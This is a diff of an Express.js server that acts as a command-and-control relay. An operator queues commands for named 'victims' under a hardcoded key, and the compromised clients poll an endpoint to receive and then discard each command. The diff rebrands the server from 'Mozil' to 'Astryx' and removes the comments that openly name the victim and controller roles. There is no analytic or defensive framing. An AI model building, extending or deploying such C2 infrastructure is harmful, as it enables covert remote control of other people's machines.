@@ -1,4 +1,3 @@
-// server.js
 const express = require('express');
 const cors = require('cors');
 const app = express();
@@ -7,14 +6,12 @@ app.use(cors());
 app.use(express.json());
 
 const COMMAND_KEY = 'moziu-super-secret';
-const commandQueue = new Map(); // victim -> command
+const commandQueue = new Map();
 
-// Health check
 app.get('/', (req, res) => {
-    res.json({ status: 'Mozil Command API Running' });
+    res.json({ status: 'Astryx Command API Running' });
 });
 
-// Controller sends command
 app.post('/api/send-command', (req, res) => {
     const { victim, key, command, timestamp } = req.body;
     
@@ -26,18 +23,16 @@ app.post('/api/send-command', (req, res) => {
         return res.status(400).json({ error: 'Missing victim or command' });
     }
     
-    // Store command for victim to poll
     commandQueue.set(victim.toLowerCase(), {
         command,
         timestamp,
         received: Date.now()
     });
     
-    console.log(`[CMD] ${victim}: ${command}`);
+    console.log(`[Astryx CMD] ${victim}: ${command}`);
     res.json({ ok: true, queued: true });
 });
 
-// Victim polls for commands
 app.get('/api/get-command', (req, res) => {
     const { user, key } = req.query;
     
@@ -49,7 +44,6 @@ app.get('/api/get-command', (req, res) => {
     const cmd = commandQueue.get(victimKey);
     
     if (cmd) {
-        // Remove after sending (one-time command)
         commandQueue.delete(victimKey);
         return res.json({ ok: true, cmd: cmd.command, ts: cmd.timestamp });
     }
@@ -57,11 +51,11 @@ app.get('/api/get-command', (req, res) => {
     res.json({ ok: true, cmd: null });
 });
 
-// Clear old commands (optional cleanup)
+// Cleanup old commands
 setInterval(() => {
     const now = Date.now();
     for (const [victim, data] of commandQueue) {
-        if (now - data.received > 30000) { // 30s timeout
+        if (now - data.received > 30000) {
             commandQueue.delete(victim);
         }
     }
@@ -69,5 +63,5 @@ setInterval(() => {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
+    console.log(`Astryx Server running on port ${PORT}`);
 });
